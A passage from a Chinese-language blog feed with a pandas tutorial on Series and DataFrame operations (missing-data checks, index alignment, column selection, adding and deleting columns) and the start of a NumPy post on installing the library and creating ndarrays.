class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>NumPy的函数或NumPy⻛格的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Numpy风格操作Serises</span></span><br><span class="line">obj2 = pd.Series([<span class="number">4</span>, <span class="number">7</span>, -<span class="number">2</span>, <span class="number">3</span>], index=[<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(obj2[obj2 &gt; <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">d    <span class="number">4</span></span><br><span class="line">b    <span class="number">7</span></span><br><span class="line">c    <span class="number">3</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li><li><p>可以使⽤字典⽣成⼀个Series</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用字典生成Series</span></span><br><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:<span class="number">222</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>:<span class="number">111</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>:<span class="number">90</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj = pd.Series(dic)</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="number">123</span></span><br><span class="line">b    <span class="number">222</span></span><br><span class="line">c    <span class="number">111</span></span><br><span class="line">d     <span class="number">90</span></span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure></li><li><p>pd.isnull()、pd.notnull() 处理缺失数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用pd.isnull()、pd.notnull() 检查缺失数据</span></span><br><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:<span class="number">123</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:<span class="number">222</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>:<span class="number">111</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>:<span class="number">90</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">obj = pd.Series(dic)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pd.isnull(obj))</span><br><span class="line"><span class="built_in">print</span>(obj.notnull())</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="literal">False</span></span><br><span class="line">b    <span class="literal">False</span></span><br><span class="line">c    <span class="literal">False</span></span><br><span class="line">d    <span class="literal">False</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br><span class="line">a    <span class="literal">True</span></span><br><span class="line">b    <span class="literal">True</span></span><br><span class="line">c    <span class="literal">True</span></span><br><span class="line">d    <span class="literal">True</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure></li><li><p>在数学操作中⾃动对⻬索引是Series的⼀个⾮常有⽤的特性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在数学操作中⾃动对⻬索引是Series的⼀个⾮常有⽤的特性</span></span><br><span class="line"></span><br><span class="line">obj = pd.Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">obj1 = pd.Series([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line">obj2 = obj + obj1</span><br><span class="line"><span class="built_in">print</span>(obj2)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="number">4.0</span></span><br><span class="line">b    <span class="number">6.0</span></span><br><span class="line">c    NaN    <span class="comment"># 3+null</span></span><br><span class="line">d    NaN    </span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure></li><li><p>可以修改索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">obj = pd.Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br><span class="line">obj1 = pd.Series([<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],index=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line">obj2 = obj + obj1</span><br><span class="line"><span class="built_in">print</span>(obj2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改索引</span></span><br><span class="line">obj2.index =  [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(obj2)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="number">4.0</span></span><br><span class="line">b    <span class="number">6.0</span></span><br><span class="line">c    NaN</span><br><span class="line">d    NaN</span><br><span class="line">dtype: float64</span><br><span class="line">A    <span class="number">4.0</span></span><br><span class="line">B    <span class="number">6.0</span></span><br><span class="line">C    NaN</span><br><span class="line">D    NaN</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure></li></ol><h1 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h1><ul><li><p>DataFrame表示的是矩阵的数据表，它包含已排序的列集合，每⼀列可以是不同的值类型（数 值、字符串、布尔值等）。</p></li><li><p>DataFrame既有⾏索引也有列索引，它可以被视为⼀个共享相同索引的Series的字典</p></li><li><p>尽管DataFrame是⼆维的，但你可以利⽤分层索引在DataFrame中展现更⾼维度的数据。</p></li></ul><ol><li><p>构建DataFrame</p><p>利用包含等⻓度列表或NumPy数组的字典来形成DataFrame</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建DataFrame</span></span><br><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frame = pd.DataFrame(dic)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   a  b</span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">2</span>  <span class="number">2</span></span><br><span class="line"><span class="number">2</span>  <span class="number">3</span>  <span class="number">3</span></span><br><span class="line"><span class="number">3</span>  <span class="number">4</span>  <span class="number">4</span></span><br><span class="line"><span class="number">4</span>  <span class="number">5</span>  <span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>columns 和 index</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frame = pd.DataFrame(dic)</span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"><span class="built_in">print</span>(frame.columns)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(frame.index))</span><br></pre></td></tr></table></figure></li><li><p>取列的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frame = pd.DataFrame(dic)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(frame[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(frame.a)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line"><span class="number">0</span>    <span class="number">1</span></span><br><span class="line"><span class="number">1</span>    <span class="number">2</span></span><br><span class="line"><span class="number">2</span>    <span class="number">3</span></span><br><span class="line"><span class="number">3</span>    <span class="number">4</span></span><br><span class="line"><span class="number">4</span>    <span class="number">5</span></span><br><span class="line">Name: a, dtype: int64</span><br><span class="line"><span class="number">0</span>    <span class="number">1</span></span><br><span class="line"><span class="number">1</span>    <span class="number">2</span></span><br><span class="line"><span class="number">2</span>    <span class="number">3</span></span><br><span class="line"><span class="number">3</span>    <span class="number">4</span></span><br><span class="line"><span class="number">4</span>    <span class="number">5</span></span><br><span class="line">Name: a, dtype: int64</span><br></pre></td></tr></table></figure></li><li><p>取行的数据 loc[] 可以通过位置或特殊属性loc进⾏选取</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line"> <span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> <span class="string">&#x27;b&#x27;</span>: [<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>],</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>: [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line"><span class="built_in">print</span>(frame.loc[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">a    <span class="number">1</span></span><br><span class="line">b    <span class="number">5</span></span><br><span class="line">c    <span class="number">7</span></span><br><span class="line">Name: <span class="number">0</span>, dtype: int64</span><br></pre></td></tr></table></figure><ol start="5"><li><p>列的引⽤是可以修改的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line"> <span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> <span class="string">&#x27;b&#x27;</span>: [<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>],</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>: [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line"><span class="comment"># print(frame.loc[0])</span></span><br><span class="line">frame[<span class="string">&#x27;a&#x27;</span>] = <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   a  b  c</span><br><span class="line"><span class="number">0</span>  <span class="number">2</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">1</span>  <span class="number">2</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">3</span>  <span class="number">2</span>  <span class="number">5</span>  <span class="number">7</span></span><br></pre></td></tr></table></figure></li><li><p>列可以新增</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line"> <span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> <span class="string">&#x27;b&#x27;</span>: [<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>],</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>: [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line">frame[<span class="string">&#x27;d&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   a  b  c  d</span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">1</span></span><br><span class="line"><span class="number">2</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">1</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"> <span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> <span class="string">&#x27;b&#x27;</span>: [<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>],</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>: [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line">frame[<span class="string">&#x27;f&#x27;</span>] = pd.Series([<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>],index=[<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   a  b  c    f</span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">6.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  NaN</span><br><span class="line"><span class="number">2</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">6.0</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span>  <span class="number">6.0</span></span><br></pre></td></tr></table></figure></li><li><p> 列可以删除  用del</p></li></ol><p>   从DataFrame中选取的列是数据的视图，而不是拷贝。</p><p>   因此，对Series的修改会映射到DataFrame中。如果需要复制，则应当显式地使⽤Series的copy方法。</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line"> <span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> <span class="string">&#x27;b&#x27;</span>: [<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>],</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>: [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line"></span><br><span class="line">frame[<span class="string">&#x27;d&#x27;</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">del</span> frame[<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">   a  b  c</span><br><span class="line"><span class="number">0</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">2</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">3</span>  <span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span></span><br></pre></td></tr></table></figure><ol start="8"><li> 返回pandas里面的全部值</li></ol><p>   和Series类似，DataFrame的values属性会将包含在DataFrame中的数据以⼆维ndarray的形式返回:</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line"> <span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line"> <span class="string">&#x27;b&#x27;</span>: [<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>],</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>: [<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">frame = pd.DataFrame(data)</span><br><span class="line"><span class="comment"># frame[&#x27;f&#x27;] = pd.Series([6,6,6],index=[0,2,3])</span></span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"><span class="built_in">print</span>(frame.values)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[<span class="number">1</span> <span class="number">5</span> <span class="number">7</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">5</span> <span class="number">7</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">5</span> <span class="number">7</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">5</span> <span class="number">7</span>]]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python数据分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NumPy基础：数组与向量化计算</title>
      <link href="/2022/09/20/NumPy%E5%9F%BA%E7%A1%80%EF%BC%9A%E6%95%B0%E7%BB%84%E4%B8%8E%E5%90%91%E9%87%8F%E5%8C%96%E8%AE%A1%E7%AE%97/"/>
      <url>/2022/09/20/NumPy%E5%9F%BA%E7%A1%80%EF%BC%9A%E6%95%B0%E7%BB%84%E4%B8%8E%E5%90%91%E9%87%8F%E5%8C%96%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h1 id="安装numpy"><a href="#安装numpy" class="headerlink" title="安装numpy"></a>安装numpy</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy</span><br></pre></td></tr></table></figure><p>安装完成后,import验证是否安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><p>若安装失败，site-package无库，尝试指定路径安装到site-package。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install numpy --target=F:\py\Analysis\vv\Lib\site-packages</span><br></pre></td></tr></table></figure><h1 id="NumPy-ndarray简介"><a href="#NumPy-ndarray简介" class="headerlink" title="NumPy ndarray简介"></a>NumPy ndarray简介</h1><ul><li><p>NumPy的核⼼特征之⼀就是N-维数组对象——ndarray。</p></li><li><p>ndarray是Python中⼀个快速、灵活的⼤型数据集容器。</p></li><li><p>数组允许你使⽤类似于标量的操作语法（ + - * / ）在整块数据上进⾏数学计算。</p></li><li><p>创建随机多维度数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建随机多维度数组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;树形结构&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = np.random.randn(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;有100个数据，每个数据有两个子数据&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[[-<span class="number">0.74827288</span> -<span class="number">1.45075245</span>]</span><br><span class="line"> [ <span class="number">1.17679731</span> -<span class="number">0.48869112</span>]</span><br><span class="line"> [ <span class="number">0.21836317</span> -<span class="number">2.03610492</span>]</span><br><span class="line"> [-<span class="number">0.53025486</span>  <span class="number">0.13229508</span>]</span><br><span class="line"> [ <span class="number">0.63948419</span>  <span class="number">1.23230828</span>]</span><br><span class="line"> [-<span class="number">0.76293931</span>  <span class="number">0.27519998</span>]</span><br><span class="line"> [ <span class="number">0.71094288</span> -<span class="number">0.82867629</span>]</span><br><span class="line"> [-<span class="number">1.85337504</span> -<span class="number">0.71654971</span>]</span><br><span class="line"> [-<span class="number">0.67857074</span>  <span class="number">1.70435235</span>]</span><br><span class="line"> [-<span class="number">0.67071459</span> -<span class="number">0.85925845</span>]]</span><br></pre></td></tr></table></figure></li></ul><h1 id="1-生成ndarray"><a href="#1-生成ndarray" class="headerlink" title="1.生成ndarray"></a>1.生成ndarray</h1><ul><li>创建一维数组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data1 = [<span class="number">6</span>, <span class="number">7.5</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">arr1 = np.array(data1)</span><br><span class="line"><span class="built_in">print</span>(arr1)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">[<span class="number">6.</span>  <span class="number">7.5</span> <span class="number">8.</span>  <span class="number">0.</span>  <span class="number">1.</span> ]</span><br></pre></td></tr></table></figure><ul><li>创建多维数组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data2 = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]]</span><br><span class="line">arr2 = np.array(data2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr2)</span><br><span class="line">//</span><br><span class="line">[[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]]</span><br></pre></td></tr></table></figure><ul><li>获取数组的维度</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取数组的维度</span></span><br><span class="line">data2 = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]]</span><br><span class="line">arr2 = np.array(data2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(arr2.shape)</span><br></pre></td></tr></table></figure><ul><li>zeros(),ones(),⽤于快速创建ndarray多维数组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 